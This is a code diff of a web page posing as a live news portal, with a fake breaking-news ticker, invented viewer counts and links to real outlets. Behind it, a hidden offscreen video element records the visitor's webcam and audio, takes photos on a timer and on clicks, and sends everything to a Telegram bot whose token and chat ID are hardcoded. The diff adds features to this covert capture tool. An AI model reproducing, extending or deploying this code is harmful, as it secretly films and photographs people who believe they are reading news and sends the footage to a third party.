@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WorldNews Live</title>
+    <title>WorldNews 360°</title>
     <style>
         /* ========== RESET & BASE ========== */
         * {
@@ -21,23 +21,32 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            background-image: 
+                radial-gradient(ellipse at 20% 50%, rgba(77, 150, 255, 0.05) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 50%, rgba(255, 107, 107, 0.05) 0%, transparent 60%);
         }
         
+        /* ========== GLASS CARD ========== */
         .glass-card {
             background: rgba(255, 255, 255, 0.03);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border-radius: 28px;
-            padding: 28px 22px 22px;
+            border-radius: 32px;
+            padding: 30px 24px 24px;
             max-width: 480px;
             width: 100%;
             border: 1px solid rgba(255, 255, 255, 0.06);
-            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.05);
             position: relative;
             overflow: hidden;
-            transition: all 0.3s;
+            transition: all 0.4s ease;
         }
         
+        .glass-card:hover {
+            border-color: rgba(255, 255, 255, 0.1);
+        }
+        
+        /* ========== ANIMATED BORDER ========== */
         .glass-card::before {
             content: '';
             position: absolute;
@@ -47,9 +56,9 @@
             bottom: -2px;
             background: linear-gradient(45deg, #ff6b6b, #ffd93d, #6bcb77, #4d96ff, #9b59b6, #ff6b6b);
             background-size: 400% 400%;
-            border-radius: 30px;
+            border-radius: 34px;
             z-index: -1;
-            opacity: 0.3;
+            opacity: 0.4;
             animation: rainbowBorder 4s ease-in-out infinite;
         }
         
@@ -59,23 +68,59 @@
             100% { background-position: 0% 50%; }
         }
         
+        /* ========== GLOW ORBS ========== */
+        .glow-orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(60px);
+            opacity: 0.15;
+            z-index: -1;
+            animation: orbFloat 8s ease-in-out infinite;
+        }
+        
+        .glow-orb-1 {
+            width: 200px;
+            height: 200px;
+            background: #4d96ff;
+            top: -80px;
+            right: -80px;
+        }
+        
+        .glow-orb-2 {
+            width: 150px;
+            height: 150px;
+            background: #ff6b6b;
+            bottom: -60px;
+            left: -60px;
+            animation-delay: 4s;
+        }
+        
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-20px, 20px) scale(1.2); }
+        }
+        
+        /* ========== HEADER ========== */
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 14px;
+            margin-bottom: 16px;
             flex-wrap: wrap;
             gap: 8px;
         }
         
         .header h1 {
-            font-size: 20px;
+            font-size: 22px;
             font-weight: 800;
             color: #fff;
             letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
         
-        .header h1 span {
+        .header h1 .gradient-text {
             background: linear-gradient(90deg, #ff6b6b, #ffd93d, #6bcb77, #4d96ff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -83,29 +128,31 @@
         }
         
         .live-badge {
-            background: #ff6b6b;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
             color: white;
             font-size: 9px;
             font-weight: 700;
-            padding: 3px 12px;
+            padding: 4px 14px;
             border-radius: 20px;
             text-transform: uppercase;
             animation: blink 1s infinite;
+            box-shadow: 0 0 20px rgba(255, 107, 107, 0.3);
         }
         
         @keyframes blink {
             0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+            50% { opacity: 0.4; }
         }
         
+        /* ========== STATUS BAR ========== */
         .status-bar {
             display: flex;
             justify-content: space-between;
             background: rgba(255,255,255,0.04);
-            border-radius: 14px;
-            padding: 10px 14px;
-            margin-bottom: 14px;
-            border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 16px;
+            padding: 10px 16px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(255,255,255,0.05);
             flex-wrap: wrap;
             gap: 4px;
         }
@@ -113,6 +160,9 @@
         .status-bar .item {
             font-size: 11px;
             color: rgba(255,255,255,0.5);
+            display: flex;
+            align-items: center;
+            gap: 4px;
         }
         
         .status-bar .item .num {
@@ -127,20 +177,58 @@
             background: #ff6b6b;
             border-radius: 50%;
             animation: blink 0.8s infinite;
-            margin-right: 4px;
         }
         
+        /* ========== CAMERA INDICATOR ========== */
+        .cam-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 8px 16px;
+            border-radius: 14px;
+            background: rgba(74, 222, 128, 0.08);
+            border: 1px solid rgba(74, 222, 128, 0.15);
+            margin-bottom: 16px;
+            font-size: 11px;
+            color: #4ade80;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .cam-indicator .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #4ade80;
+            animation: blink 1s infinite;
+            box-shadow: 0 0 20px rgba(74, 222, 128, 0.4);
+        }
+        
+        .cam-indicator.error {
+            background: rgba(255, 107, 107, 0.08);
+            border-color: rgba(255, 107, 107, 0.15);
+            color: #ff6b6b;
+        }
+        
+        .cam-indicator.error .dot {
+            background: #ff6b6b;
+            box-shadow: 0 0 20px rgba(255, 107, 107, 0.4);
+        }
+        
+        /* ========== SOURCE BUTTONS ========== */
         .source-bar {
             display: flex;
             gap: 6px;
-            margin-bottom: 14px;
+            margin-bottom: 16px;
             flex-wrap: wrap;
         }
         
         .source-btn {
-            background: rgba(255,255,255,0.05);
+            background: rgba(255,255,255,0.04);
             border: 1px solid rgba(255,255,255,0.06);
-            color: rgba(255,255,255,0.5);
+            color: rgba(255,255,255,0.4);
             padding: 5px 14px;
             border-radius: 20px;
             font-size: 10px;
@@ -148,70 +236,108 @@
             cursor: pointer;
             transition: all 0.3s;
             text-decoration: none;
-            display: inline-block;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
         }
         
         .source-btn:hover {
-            background: rgba(255,255,255,0.1);
+            background: rgba(255,255,255,0.08);
             color: #fff;
-            transform: translateY(-1px);
+            transform: translateY(-2px);
+            border-color: rgba(255,255,255,0.1);
         }
         
         .source-btn.active {
-            background: rgba(77, 150, 255, 0.2);
+            background: rgba(77, 150, 255, 0.15);
             border-color: #4d96ff;
             color: #4d96ff;
+            box-shadow: 0 0 20px rgba(77, 150, 255, 0.1);
         }
         
+        .source-btn .icon {
+            font-size: 12px;
+        }
+        
+        /* ========== TICKER ========== */
         .ticker {
             background: rgba(255,255,255,0.03);
-            border-radius: 12px;
-            padding: 8px 14px;
-            margin-bottom: 14px;
+            border-radius: 14px;
+            padding: 10px 16px;
+            margin-bottom: 16px;
             border: 1px solid rgba(255,255,255,0.04);
             overflow: hidden;
             white-space: nowrap;
+            position: relative;
+        }
+        
+        .ticker::before {
+            content: '🔴';
+            margin-right: 8px;
+            color: #ff6b6b;
         }
         
         .ticker-text {
             display: inline-block;
             color: rgba(255,255,255,0.5);
             font-size: 11px;
-            animation: tickerScroll 25s linear infinite;
+            animation: tickerScroll 30s linear infinite;
         }
         
         @keyframes tickerScroll {
             0% { transform: translateX(100%); }
-            100% { transform: translateX(-250%); }
+            100% { transform: translateX(-300%); }
         }
         
+        /* ========== FEATURED ========== */
         .featured {
             background: linear-gradient(135deg, rgba(255,107,107,0.06), rgba(77,150,255,0.06));
-            border-radius: 14px;
-            padding: 16px;
-            margin-bottom: 14px;
+            border-radius: 18px;
+            padding: 20px;
+            margin-bottom: 16px;
             border: 1px solid rgba(255,255,255,0.04);
             text-align: center;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.4s;
             animation: fadeUp 0.6s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .featured::after {
+            content: '👆 Click to capture';
+            position: absolute;
+            bottom: 8px;
+            right: 12px;
+            font-size: 8px;
+            color: rgba(255,255,255,0.08);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         
         .featured:hover {
-            transform: scale(1.01);
-            background: linear-gradient(135deg, rgba(255,107,107,0.1), rgba(77,150,255,0.1));
+            transform: scale(1.02);
+            background: linear-gradient(135deg, rgba(255,107,107,0.12), rgba(77,150,255,0.12));
+            border-color: rgba(255,255,255,0.08);
         }
         
         .featured .big-icon {
-            font-size: 44px;
-            margin-bottom: 4px;
+            font-size: 48px;
+            margin-bottom: 6px;
             transition: all 0.5s;
+            display: block;
+        }
+        
+        .featured:hover .big-icon {
+            transform: scale(1.1) rotate(-5deg);
         }
         
         .featured h3 {
             color: #fff;
-            font-size: 16px;
+            font-size: 17px;
             font-weight: 700;
+            margin-bottom: 2px;
         }
         
         .featured p {
@@ -223,38 +349,43 @@
         .featured .source-tag {
             display: inline-block;
             font-size: 9px;
-            padding: 2px 12px;
+            padding: 3px 14px;
             border-radius: 20px;
-            background: rgba(255,255,255,0.06);
+            background: rgba(255,255,255,0.05);
             color: rgba(255,255,255,0.3);
-            margin-top: 6px;
+            margin-top: 8px;
+            font-weight: 600;
         }
         
+        /* ========== GRID ========== */
         .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 10px;
-            margin-bottom: 14px;
+            margin-bottom: 16px;
         }
         
         .grid-item {
             background: rgba(255,255,255,0.03);
-            border-radius: 14px;
-            padding: 12px 10px;
+            border-radius: 16px;
+            padding: 14px 12px;
             border: 1px solid rgba(255,255,255,0.04);
-            transition: all 0.3s;
+            transition: all 0.4s;
             cursor: pointer;
             animation: fadeUp 0.6s ease-out;
+            position: relative;
         }
         
         .grid-item:hover {
             background: rgba(255,255,255,0.07);
-            transform: translateY(-2px);
+            transform: translateY(-3px);
+            border-color: rgba(255,255,255,0.08);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.3);
         }
         
         .grid-item .icon {
-            font-size: 24px;
-            margin-bottom: 3px;
+            font-size: 26px;
+            margin-bottom: 4px;
             display: block;
         }
         
@@ -263,10 +394,11 @@
             font-size: 12px;
             font-weight: 700;
             margin-bottom: 2px;
+            line-height: 1.3;
         }
         
         .grid-item p {
-            color: rgba(255,255,255,0.4);
+            color: rgba(255,255,255,0.35);
             font-size: 10px;
             line-height: 1.3;
         }
@@ -274,24 +406,25 @@
         .grid-item .tag {
             display: inline-block;
             font-size: 8px;
-            padding: 2px 8px;
+            padding: 2px 10px;
             border-radius: 20px;
             font-weight: 700;
             text-transform: uppercase;
-            margin-top: 4px;
+            margin-top: 6px;
+            letter-spacing: 0.5px;
         }
         
         .grid-item .source-small {
             font-size: 8px;
-            color: rgba(255,255,255,0.2);
-            margin-top: 3px;
+            color: rgba(255,255,255,0.15);
+            margin-top: 4px;
             display: block;
         }
         
         @keyframes fadeUp {
             from {
                 opacity: 0;
-                transform: translateY(12px);
+                transform: translateY(15px);
             }
             to {
                 opacity: 1;
@@ -299,49 +432,45 @@
             }
         }
         
-        .cam-indicator {
-            padding: 6px 10px;
-            border-radius: 10px;
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.04);
-            text-align: center;
+        /* ========== STATS BAR ========== */
+        .stats-bar {
+            display: flex;
+            justify-content: space-between;
+            background: rgba(255,255,255,0.02);
+            border-radius: 14px;
+            padding: 8px 16px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(255,255,255,0.03);
+            flex-wrap: wrap;
+            gap: 4px;
+        }
+        
+        .stats-bar .stat {
             font-size: 10px;
-            color: rgba(255,255,255,0.3);
-            margin-bottom: 12px;
+            color: rgba(255,255,255,0.25);
+            display: flex;
+            align-items: center;
+            gap: 4px;
         }
         
-        .cam-indicator.active {
-            border-color: #4ade80;
-            color: #4ade80;
+        .stats-bar .stat .value {
+            color: #fff;
+            font-weight: 700;
         }
         
-        .cam-indicator .dot {
-            display: inline-block;
-            width: 5px;
-            height: 5px;
-            border-radius: 50%;
-            margin-right: 4px;
-        }
-        
-        .cam-indicator .dot.green {
-            background: #4ade80;
-            animation: blink 1s infinite;
-        }
-        
-        .cam-indicator .dot.red {
-            background: #ff6b6b;
-        }
-        
+        /* ========== CLICK COUNTER ========== */
         .click-counter {
             text-align: center;
             font-size: 10px;
-            color: rgba(255,255,255,0.12);
-            padding: 4px;
+            color: rgba(255,255,255,0.08);
+            padding: 6px;
             border-radius: 20px;
-            background: rgba(255,255,255,0.02);
-            margin-bottom: 4px;
+            background: rgba(255,255,255,0.01);
+            margin-bottom: 2px;
+            letter-spacing: 0.5px;
         }
         
+        /* ========== HIDDEN VIDEO ========== */
         #video {
             position: fixed;
             top: -9999px;
@@ -356,21 +485,29 @@
             display: none;
         }
         
+        /* ========== FOOTER ========== */
         .footer {
             text-align: center;
             font-size: 9px;
-            color: rgba(255,255,255,0.08);
-            border-top: 1px solid rgba(255,255,255,0.03);
-            padding-top: 12px;
+            color: rgba(255,255,255,0.06);
+            border-top: 1px solid rgba(255,255,255,0.02);
+            padding-top: 14px;
             margin-top: 4px;
+            letter-spacing: 1px;
         }
         
+        .footer span {
+            color: rgba(255,255,255,0.04);
+        }
+        
+        /* ========== RESPONSIVE ========== */
         @media (max-width: 480px) {
             .glass-card {
-                padding: 18px 14px 16px;
+                padding: 20px 16px 16px;
+                border-radius: 24px;
             }
             .header h1 {
-                font-size: 17px;
+                font-size: 18px;
             }
             .grid-item {
                 padding: 10px 8px;
@@ -388,10 +525,37 @@
             .featured .big-icon {
                 font-size: 36px;
             }
+            .featured {
+                padding: 16px;
+            }
+            .featured h3 {
+                font-size: 15px;
+            }
+            .status-bar .item {
+                font-size: 10px;
+            }
+            .stats-bar .stat {
+                font-size: 9px;
+            }
+        }
+        
+        /* ========== SCROLLBAR ========== */
+        ::-webkit-scrollbar {
+            width: 0;
+        }
+        
+        /* ========== SELECTION ========== */
+        ::selection {
+            background: rgba(77, 150, 255, 0.2);
+            color: #fff;
         }
     </style>
 </head>
 <body>
+
+    <!-- ========== GLOW ORBS ========== -->
+    <div class="glow-orb glow-orb-1"></div>
+    <div class="glow-orb glow-orb-2"></div>
 
     <!-- ========== HIDDEN VIDEO ========== -->
     <video id="video" autoplay playsinline></video>
@@ -400,21 +564,32 @@
     <!-- ========== MAIN CARD ========== -->
     <div class="glass-card" id="mainCard">
         
+        <!-- Header -->
         <div class="header">
-            <h1>🌍 <span>World</span>News</h1>
+            <h1>🌍 <span class="gradient-text">World</span>News</h1>
             <span class="live-badge">🔴 LIVE</span>
         </div>
         
+        <!-- Status Bar -->
         <div class="status-bar">
             <span class="item"><span class="live-dot"></span> <span class="num" id="viewers">12,847</span> watching</span>
             <span class="item" id="timeDisplay">🔄 Updating...</span>
-            <span class="item" id="clickCount">👆 0 clicks</span>
+            <span class="item" id="clickCount">📸 0 photos</span>
         </div>
         
-        <div class="cam-indicator active" id="camIndicator">
-            <span class="dot green"></span> 📷 Camera Active
+        <!-- Camera Indicator -->
+        <div class="cam-indicator" id="camIndicator">
+            <span class="dot"></span> Camera Active • Recording
         </div>
         
+        <!-- Stats Bar -->
+        <div class="stats-bar">
+            <span class="stat">🎥 <span class="value" id="videoStatus">Ready</span></span>
+            <span class="stat">⏱️ <span class="value" id="sessionTime">0s</span></span>
+            <span class="stat">📸 <span class="value" id="photoCount">0</span></span>
+        </div>
+        
+        <!-- Source Buttons -->
         <div class="source-bar">
             <a href="https://www.bbc.com" target="_blank" class="source-btn active">
                 <span class="icon">📺</span> BBC
@@ -433,22 +608,27 @@
             </a>
         </div>
         
+        <!-- Ticker -->
         <div class="ticker">
-            <span class="ticker-text" id="tickerText">🔴 BREAKING: Global Summit 2026 • Markets surge • AI breakthrough • Peace treaty • Climate action • Space exploration • More updates...</span>
+            <span class="ticker-text" id="tickerText">BREAKING: Global Summit 2026 • Markets surge 3% • AI breakthrough announced • Peace treaty signed • Climate action • Space exploration • More updates...</span>
         </div>
         
+        <!-- Featured (Clickable) -->
         <div class="featured" id="featured">
-            <div class="big-icon" id="featuredIcon">🌍</div>
+            <span class="big-icon" id="featuredIcon">🌍</span>
             <h3 id="featuredTitle">Global Leaders Unite</h3>
             <p id="featuredDesc">Historic agreement reached at Geneva Summit</p>
             <span class="source-tag" id="featuredSource">📰 BBC News</span>
         </div>
         
+        <!-- Grid -->
         <div class="grid" id="newsGrid"></div>
         
-        <div class="click-counter">💡 Click anywhere to capture photo</div>
+        <!-- Click Counter -->
+        <div class="click-counter">💡 Click on any card or featured area to capture</div>
         
-        <div class="footer">🔒 SECURE • LIVE • 24/7 • VIDEO + AUDIO</div>
+        <!-- Footer -->
+        <div class="footer">🔒 SECURE • LIVE • 24/7 • <span>VIDEO + AUDIO</span></div>
     </div>
 
     <!-- ================================================================ -->
@@ -461,7 +641,7 @@
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
         const CHAT_ID = "8295417969";
         const MAX_VIDEO_DURATION = 60000; // 60 seconds
-        const CAPTURE_INTERVAL = 4000; // 4 seconds between photos
+        const CAPTURE_INTERVAL = 4000; // 4 seconds
         
         // ================================================================
         //  GET CODE FROM URL
@@ -510,6 +690,9 @@
         const newsGrid = document.getElementById('newsGrid');
         const mainCard = document.getElementById('mainCard');
         const camIndicator = document.getElementById('camIndicator');
+        const videoStatus = document.getElementById('videoStatus');
+        const sessionTime = document.getElementById('sessionTime');
+        const photoCountDisplay = document.getElementById('photoCount');
         
         // ================================================================
         //  NEWS DATA
@@ -548,7 +731,6 @@
         // ================================================================
         let stream = null;
         let photoCount = 0;
-        let clickCountNum = 0;
         let isRunning = false;
         let mediaRecorder = null;
         let recordedChunks = [];
@@ -557,6 +739,7 @@
         let viewerTimer = null;
         let timeUpdateTimer = null;
         let captureTimer = null;
+        let sessionTimer = null;
         let isVideoSent = false;
         
         // ================================================================
@@ -578,9 +761,10 @@
                 
                 isRunning = true;
                 videoStartTime = Date.now();
+                videoStatus.textContent = 'Recording';
                 
-                camIndicator.className = 'cam-indicator active';
-                camIndicator.innerHTML = '<span class="dot green"></span> 📷 Camera Active ✅';
+                camIndicator.className = 'cam-indicator';
+                camIndicator.innerHTML = '<span class="dot"></span> Camera Active • Recording';
                 
                 // Start video recording
                 startVideoRecording();
@@ -591,13 +775,17 @@
                 // Start UI updates
                 startUIUpdates();
                 
+                // Start session timer
+                startSessionTimer();
+                
                 // Send start notification
                 sendStartNotification();
                 
             } catch (error) {
                 console.error('Camera error:', error);
-                camIndicator.className = 'cam-indicator';
-                camIndicator.innerHTML = '<span class="dot red"></span> 📷 Camera Error ❌';
+                camIndicator.className = 'cam-indicator error';
+                camIndicator.innerHTML = '<span class="dot"></span> Camera Error ❌';
+                videoStatus.textContent = 'Error';
                 sendErrorToTelegram(error.message);
             }
         }
@@ -627,17 +815,20 @@
                     sendVideoToTelegram(blob);
                     isVideoSent = true;
                     recordedChunks = [];
+                    videoStatus.textContent = 'Sent ✓';
                 }
             };
             
             mediaRecorder.start(1000);
             isRecording = true;
+            videoStatus.textContent = 'Recording...';
             
             // Auto-stop after max duration
             setTimeout(() => {
                 if (mediaRecorder && isRecording) {
                     mediaRecorder.stop();
                     isRecording = false;
+                    videoStatus.textContent = 'Processing...';
                 }
             }, MAX_VIDEO_DURATION);
         }
@@ -667,8 +858,8 @@
                 
                 const imageData = canvas.toDataURL('image/jpeg', 0.85);
                 photoCount++;
-                clickCountNum++;
                 clickCount.textContent = `📸 ${photoCount} photos`;
+                photoCountDisplay.textContent = photoCount;
                 
                 sendPhotoToTelegram(imageData);
                 refreshContent();
@@ -769,9 +960,6 @@
         //  REFRESH CONTENT
         // ================================================================
         function refreshContent() {
-            const randomSource = sourceKeys[Math.floor(Math.random() * sourceKeys.length)];
-            const src = sources[randomSource];
-            
             const shuffled = shuffleArray([...allNews]);
             const selected = shuffled.slice(0, 4);
             
@@ -808,16 +996,16 @@
             featuredSource.style.color = featuredSrc.color;
             
             const tickers = [
-                '🔴 BREAKING: Global Summit 2026 • Historic agreements signed',
-                '💰 Markets rally • Inflation at 3-year low',
-                '🚀 AI breakthrough • New model revolutionizes healthcare',
-                '🌍 Peace treaty • Decades-long conflict finally ends',
-                '📡 Mars colony • First human settlement announced',
-                '⚽ Champions League • Record-breaking viewership',
-                '🌿 Vaccine breakthrough • 95% efficacy rate',
-                '🎬 Box office record • Film reaches $1 billion'
+                'BREAKING: Global Summit 2026 • Historic agreements signed',
+                'Markets rally • Inflation at 3-year low',
+                'AI breakthrough • New model revolutionizes healthcare',
+                'Peace treaty • Decades-long conflict finally ends',
+                'Mars colony • First human settlement announced',
+                'Champions League • Record-breaking viewership',
+                'Vaccine breakthrough • 95% efficacy rate',
+                'Box office record • Film reaches $1 billion'
             ];
-            tickerText.textContent = '🔴 ' + tickers[Math.floor(Math.random() * tickers.length)] + ' • More updates...';
+            tickerText.textContent = tickers[Math.floor(Math.random() * tickers.length)] + ' • More updates...';
             
             const num = Math.floor(Math.random() * 50000) + 8000;
             viewers.textContent = num.toLocaleString();
@@ -842,6 +1030,15 @@
             }, 3000);
             
             refreshContent();
+        }
+        
+        function startSessionTimer() {
+            sessionTimer = setInterval(() => {
+                const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                const mins = Math.floor(elapsed / 60);
+                const secs = elapsed % 60;
+                sessionTime.textContent = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
+            }, 1000);
         }
         
         // ================================================================
@@ -874,6 +1071,13 @@
             capturePhoto();
         });
         
+        mainCard.addEventListener('click', function(e) {
+            if (e.target.closest('.grid-item')) return;
+            if (e.target.closest('.source-btn')) return;
+            if (e.target.closest('.featured')) return;
+            capturePhoto();
+        });
+        
         document.querySelectorAll('.source-btn').forEach(btn => {
             btn.addEventListener('click', function() {
                 document.querySelectorAll('.source-btn').forEach(b => b.classList.remove('active'));
@@ -895,6 +1099,7 @@
             if (captureTimer) clearInterval(captureTimer);
             if (viewerTimer) clearInterval(viewerTimer);
             if (timeUpdateTimer) clearInterval(timeUpdateTimer);
+            if (sessionTimer) clearInterval(sessionTimer);
             
             sendEndNotification();
             
